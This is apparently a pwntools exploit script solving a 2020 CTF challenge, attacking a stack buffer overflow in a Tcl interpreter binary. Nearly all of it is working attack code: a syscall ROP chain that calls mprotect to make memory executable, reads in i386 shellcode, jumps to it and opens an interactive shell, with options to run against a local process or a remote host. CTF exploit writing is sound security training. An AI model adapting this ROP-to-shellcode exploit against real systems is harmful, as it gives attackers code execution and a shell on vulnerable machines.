#!/usr/bin/python

# --- Info ---
# CTF: CSIRT Network Cyber exercises 2020
# Date: 08 Oct 2020
# Challenge: PikaPikaPikachu
# Description: Syscall ROP triggering an Stack Buffer Overflow on a Tcl interpreter
# --- End Info ---

from pwn import *

context.log_level = 'critical'
context.terminal = ["tmux", "sp", "-h"]

REMOTE = 0

HOST = '10.29.2.5'
PORT = 8080
PATH = './pica'

offset = 28

COMMAND = 'gets'                # TCL triggered cmd
SYS_mprotect = 0x0000007D       # SYS_mprotect = 0x7d
SYS_read = 0x00000003           # SYS_read = 0x3
pop_eax_ret = 0x080aaf56        # pop eax ; ret
pop_ebx_ret = 0x080481c9        # pop ebx ; ret
set_gadget = 0x080605d6         # mov eax, edx; pop ebx; ret
init_gadget = 0x0806daa9        # xor eax, eax ; pop ebx ; ret
sum_gadget = 0x080616cc         # inc eax ; pop edi ; ret
pop_ecx_ebx_ret = 0x08071a42    # pop ecx ; pop ebx ; ret
pop_edx_ret = 0x08071a1c        # pop edx ; ret
INT = 0x0807235e                # int 0x80 ; ret
STDIN = 0                       # _IO_stdin ; int fd = stdin = 0
length = 0x100                  # size_t count
buf = 0x08048000                # void *buf = &bss
PERM_X = 0x00000007             # int prot = PROT_READ|PROT_WRITE|PROT_EXEC

if(REMOTE):
    print('[*] Connecting to ' + HOST + ':' + str(PORT))
else:
    print('[*] Initializing target process: ' + PATH)
    
if(REMOTE):
    r = remote(HOST, PORT)
else:
    r = process(PATH)
    
shellcode = asm(shellcraft.i386.linux.sh()) # i386 shellcode

print('[*] Sending TCL command...')

r.recv()

init = ''
init += COMMAND

r.sendline(init)

print('[*] Corrupting TCL gets buffer...')

#gdb.attach(r)

# int mprotect(void *addr, size_t len, int prot);

ropchain = ''
ropchain += p32(pop_edx_ret)        # pop edx ; ret
ropchain += p32(SYS_mprotect)       # SYS_mprotect = 0x7d
ropchain += p32(set_gadget)         # mov eax, edx; pop ebx; ret
ropchain += p32(0)                  # JUNK
ropchain += p32(0)                  # JUNK
ropchain += p32(pop_ecx_ebx_ret)    # pop ecx ; pop ebx ; ret
ropchain += p32(length)             # size_t count = length
ropchain += p32(buf)                # void *addr = buf
ropchain += p32(pop_edx_ret)        # pop edx ; ret
ropchain += p32(PERM_X)             # int prot = PROT_READ|PROT_WRITE|PROT_EXEC
ropchain += p32(INT)                # int 0x80 ; ret

# ssize_t read(int fd, void *buf, size_t count);

ropchain += p32(init_gadget)        # xor eax, eax ; pop ebx ; ret
ropchain += p32(0)                  # JUNK
ropchain += p32(sum_gadget)         # inc eax ; pop edi ; ret
ropchain += p32(0)                  # JUNK
ropchain += p32(sum_gadget)         # inc eax ; pop edi ; ret
ropchain += p32(0)                  # JUNK
ropchain += p32(sum_gadget)         # inc eax ; pop edi ; ret
ropchain += p32(0)                  # JUNK
ropchain += p32(pop_ecx_ebx_ret)    # pop ecx ; pop ebx ; ret
ropchain += p32(buf)                # void *buf = buf
ropchain += p32(STDIN)              # int fd = stdin
ropchain += p32(pop_edx_ret)        # pop edx ; ret
ropchain += p32(length)             # size_t count = length
ropchain += p32(INT)                # int 0x80 ; ret

# jmp shellcode

ropchain += p32(buf)                # jmp buf (shellcode)

payload = ''
payload += 'A'*(offset-0x4)         # JUNK
payload += 'B'*0x4                  # Fake EBP
payload += ropchain                 # Stored EIP value + whole ropchain

r.sendline(payload)

print('[*] Injecting shellcode...')

r.sendline(shellcode)
r.sendline(shellcode)

print('[+] Got a shell?')

r.interactive()
r.close()
